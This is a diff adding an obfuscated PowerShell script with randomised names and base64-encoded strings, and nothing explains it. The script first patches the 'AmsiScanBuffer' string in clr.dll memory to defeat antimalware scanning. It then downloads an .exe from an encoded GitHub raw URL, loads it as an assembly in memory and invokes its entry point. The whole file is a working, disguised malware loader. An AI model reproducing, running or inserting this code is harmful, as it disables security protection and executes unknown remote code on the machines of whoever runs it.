@@ -1,0 +1,150 @@
+$JyTychQo = 0x02
+$dvWpckmY = 0x04
+$YJZFtICu = 0x40
+$HHhDAGBU = 0x20
+$SNwIDYHq = 0x100
+$TZFAMXpY = 0x1000
+$QQkfcAtj = 260
+function qGplKVvi {
+    param ($OaVqdGVc, $cVJzFpBo)
+    return ((($OaVqdGVc -band $JyTychQo) -eq $JyTychQo -or ($OaVqdGVc -band $dvWpckmY) -eq $dvWpckmY -or ($OaVqdGVc -band $YJZFtICu) -eq $YJZFtICu -or ($OaVqdGVc -band $HHhDAGBU) -eq $HHhDAGBU) -and ($OaVqdGVc -band $SNwIDYHq) -ne $SNwIDYHq -and ($cVJzFpBo -band $TZFAMXpY) -eq $TZFAMXpY)
+}
+function AmgyjNif {
+    param ($yGIAxmuE, $sDdpTRQw, $rQUFkxhb)
+    for ($bkojHFDa = 0; $bkojHFDa -lt $sDdpTRQw.Length; $bkojHFDa++) {
+        if ($yGIAxmuE[$rQUFkxhb + $bkojHFDa] -ne $sDdpTRQw[$bkojHFDa]) {
+            return $moJxpPcK
+        }
+    }
+    return $VmYdRGpj
+}
+if ($aglwxivX.PSVersion.Major -gt 2) {
+    $SmPamPuV = New-Object System.Reflection.AssemblyName([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luMzI=")))
+    $myQYcjef = [AppDomain]::CurrentDomain.DefineDynamicAssembly($SmPamPuV, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $dKCgaPrw = $myQYcjef.DefineDynamicModule([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luMzI=")), $UOmttAoL)
+    $pSqZTqfq = $dKCgaPrw.DefineType([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luMzIuTUVNT1JZX0lORk9fQkFTSUM=")), [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QmFzZUFkZHJlc3M=")), [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb2NhdGlvbkJhc2U=")), [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb2NhdGlvblByb3RlY3Q=")), [Int32], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVnaW9uU2l6ZQ==")), [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RhdGU=")), [Int32], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvdGVjdA==")), [Int32], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHlwZQ==")), [Int32], [System.Reflection.FieldAttributes]::Public)
+    $CUHGpved = $pSqZTqfq.CreateType()
+    $pSqZTqfq = $dKCgaPrw.DefineType([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luMzIuU1lTVEVNX0lORk8=")), [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d1Byb2Nlc3NvckFyY2hpdGVjdHVyZQ==")), [UInt16], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d1Jlc2VydmVk")), [UInt16], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZHdQYWdlU2l6ZQ==")), [UInt32], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bHBNaW5pbXVtQXBwbGljYXRpb25BZGRyZXNz")), [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bHBNYXhpbXVtQXBwbGljYXRpb25BZGRyZXNz")), [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZHdBY3RpdmVQcm9jZXNzb3JNYXNr")), [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZHdOdW1iZXJPZlByb2Nlc3NvcnM=")), [UInt32], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZHdQcm9jZXNzb3JUeXBl")), [UInt32], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZHdBbGxvY2F0aW9uR3JhbnVsYXJpdHk=")), [UInt32], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d1Byb2Nlc3NvckxldmVs")), [UInt16], [System.Reflection.FieldAttributes]::Public)
+    [void]$pSqZTqfq.DefineField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d1Byb2Nlc3NvclJldmlzaW9u")), [UInt16], [System.Reflection.FieldAttributes]::Public)
+    $RADIgBbr = $pSqZTqfq.CreateType()
+    $pSqZTqfq = $dKCgaPrw.DefineType([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luMzIuS2VybmVsMzI=")), [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLCBDbGFzcw==")))
+    $pcazMqIh = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+    $NYSyTAwD = [Runtime.InteropServices.DllImportAttribute].GetField([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0TGFzdEVycm9y")))
+    $SlNxAWbT = New-Object Reflection.Emit.CustomAttributeBuilder($pcazMqIh, [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzIuZGxs")), [Reflection.FieldInfo[]]@($NYSyTAwD), @($rLvRlzlJ))
+    $TIMHoVnF = $pSqZTqfq.DefinePInvokeMethod([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmlydHVhbFByb3RlY3Q=")), [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzIuZGxs")), ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [bool], [Type[]]@([IntPtr], [IntPtr], [Int32], [Int32].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $TIMHoVnF.SetCustomAttribute($SlNxAWbT)
+    $TIMHoVnF = $pSqZTqfq.DefinePInvokeMethod([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0Q3VycmVudFByb2Nlc3M=")), [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzIuZGxs")), ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@(), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $TIMHoVnF.SetCustomAttribute($SlNxAWbT)
+    $TIMHoVnF = $pSqZTqfq.DefinePInvokeMethod([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmlydHVhbFF1ZXJ5")), [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzIuZGxs")), ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@([IntPtr], [Win32.MEMORY_INFO_BASIC].MakeByRefType(), [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $TIMHoVnF.SetCustomAttribute($SlNxAWbT)
+    $TIMHoVnF = $pSqZTqfq.DefinePInvokeMethod([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3lzdGVtSW5mbw==")), [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzIuZGxs")), ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [void], [Type[]]@([Win32.SYSTEM_INFO].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $TIMHoVnF.SetCustomAttribute($SlNxAWbT)
+    $TIMHoVnF = $pSqZTqfq.DefinePInvokeMethod([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0TWFwcGVkRmlsZU5hbWU=")), [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHNhcGkuZGxs")), ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [System.Text.StringBuilder], [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $TIMHoVnF.SetCustomAttribute($SlNxAWbT)
+    $TIMHoVnF = $pSqZTqfq.DefinePInvokeMethod([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")), [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzIuZGxs")), ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $TIMHoVnF.SetCustomAttribute($SlNxAWbT)
+    $TIMHoVnF = $pSqZTqfq.DefinePInvokeMethod([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVQcm9jZXNzTWVtb3J5")), [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzIuZGxs")), ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $TIMHoVnF.SetCustomAttribute($SlNxAWbT)
+    $NJPmUhjr = $pSqZTqfq.CreateType()
+    $GOFyRSro = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QW1z"))
+    $NtCWaJQo = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aVNj"))
+    $VhXJKGhp = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YW5CdWY="))
+    $PgrUJORg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZmVy"))
+    $VvLfRzoV = [System.Text.Encoding]::UTF8.GetBytes($GOFyRSro + $NtCWaJQo + $VhXJKGhp + $PgrUJORg)
+    $oPzcLOlS = [Win32.Kernel32]::GetCurrentProcess()
+    $aVYtSMWT = New-Object Win32.SYSTEM_INFO
+    [void][Win32.Kernel32]::GetSystemInfo([ref]$aVYtSMWT)
+    $eJoURqfR = @()
+    $BpVZWCKE = [IntPtr]::Zero
+    while ($BpVZWCKE.ToInt64() -lt $aVYtSMWT.lpMaximumApplicationAddress.ToInt64()) {
+        $SkJOeuHW = New-Object Win32.MEMORY_INFO_BASIC
+        if ([Win32.Kernel32]::VirtualQuery($BpVZWCKE, [ref]$SkJOeuHW, [System.Runtime.InteropServices.Marshal]::SizeOf($SkJOeuHW))) {
+            $eJoURqfR += $SkJOeuHW
+        }
+        $BpVZWCKE = New-Object IntPtr($SkJOeuHW.BaseAddress.ToInt64() + $SkJOeuHW.RegionSize.ToInt64())
+    }
+    $yVFOqPls = 0
+    foreach ($CnREGnSf in $eJoURqfR) {
+        if (-not (qGplKVvi $CnREGnSf.Protect $CnREGnSf.State)) {
+            continue
+        }
+        $HyzoEhov = New-Object System.Text.StringBuilder $QQkfcAtj
+        if ([Win32.Kernel32]::GetMappedFileName($oPzcLOlS, $CnREGnSf.BaseAddress, $HyzoEhov, $QQkfcAtj) -gt 0) {
+            $ahtmPrVX = $HyzoEhov.ToString()
+            if ($ahtmPrVX.EndsWith([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y2xyLmRsbA==")), [StringComparison]::InvariantCultureIgnoreCase)) {
+                $yGIAxmuE = New-Object byte[] $CnREGnSf.RegionSize.ToInt64()
+                $qMsSjPOh = 0
+                [void][Win32.Kernel32]::ReadProcessMemory($oPzcLOlS, $CnREGnSf.BaseAddress, $yGIAxmuE, $yGIAxmuE.Length, [ref]$qMsSjPOh)
+                for ($sxgPZRzv = 0; $sxgPZRzv -lt ($qMsSjPOh - $VvLfRzoV.Length); $sxgPZRzv++) {
+                    $UNhNfAsl = $rLvRlzlJ
+                    for ($ZHoilebm = 0; $ZHoilebm -lt $VvLfRzoV.Length; $ZHoilebm++) {
+                        if ($yGIAxmuE[$sxgPZRzv + $ZHoilebm] -ne $VvLfRzoV[$ZHoilebm]) {
+                            $UNhNfAsl = $UOmttAoL
+                            break
+                        }
+                    }
+                    if ($UNhNfAsl) {
+                        $VedqPEFH = 0
+                        if (($CnREGnSf.Protect -band $dvWpckmY) -ne $dvWpckmY) {
+                            [void][Win32.Kernel32]::VirtualProtect($CnREGnSf.BaseAddress, $yGIAxmuE.Length, $YJZFtICu, [ref]$VedqPEFH)
+                        }
+                        $KcHVURXC = New-Object byte[] $VvLfRzoV.Length
+                        $JxlnKSoX = 0
+                        [void][Win32.Kernel32]::WriteProcessMemory($oPzcLOlS, [IntPtr]::Add($CnREGnSf.BaseAddress, $sxgPZRzv), $KcHVURXC, $KcHVURXC.Length, [ref]$JxlnKSoX)
+                        $yVFOqPls++
+                        if (($CnREGnSf.Protect -band $dvWpckmY) -ne $dvWpckmY) {
+                            [void][Win32.Kernel32]::VirtualProtect($CnREGnSf.BaseAddress, $yGIAxmuE.Length, $CnREGnSf.Protect, [ref]$VedqPEFH)
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+$wUnCwJCF = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL3dodXBzeGQvMTI0NTQxMjEvcmF3L3JlZnMvaGVhZHMvbWFpbi8xMjEyMS5leGU="))
+Add-Type -AssemblyName System.Net.Http
+$polBHPtT = [System.Net.Http.HttpClient]::new()
+$NwCwiHXA = $polBHPtT.GetByteArrayAsync($wUnCwJCF)
+$NwCwiHXA.Wait()
+$cBouFzqo = $NwCwiHXA.Result
+try {
+    [Reflection.Assembly]$UKNhCDjA = [System.AppDomain]::CurrentDomain.Load($cBouFzqo)
+    $alxPYwMZ = $UKNhCDjA.EntryPoint
+    if ($HhtHedWD -ne $alxPYwMZ) {
+        $JGtcQzBn = $alxPYwMZ.GetParameters()
+        if ($JGtcQzBn.Count -eq 0) {
+            $alxPYwMZ.Invoke($HhtHedWD, $HhtHedWD)
+        } else {
+            $sWvsPvBr = New-Object Object[] $JGtcQzBn.Count
+            for ($bkojHFDa = 0; $bkojHFDa -lt $JGtcQzBn.Count; $bkojHFDa++) {
+                if ($JGtcQzBn[$bkojHFDa].ParameterType -eq [string[]]) {
+                    $sWvsPvBr[$bkojHFDa] = [string[]]@()
+                } else {
+                    $sWvsPvBr[$bkojHFDa] = $HhtHedWD
+                }
+            }
+            $alxPYwMZ.Invoke($HhtHedWD, $sWvsPvBr)
+        }
+    } else {
+        Write-Warning [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXNzZW1ibHkgZW50cnkgcG9pbnQgYnVsdW5hbWFkxLEu"))
+    }
+} catch {
+    Write-Error [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXNzZW1ibHkgecO8a2xlbmlya2VuIGhhdGE6ICRf"))
+}
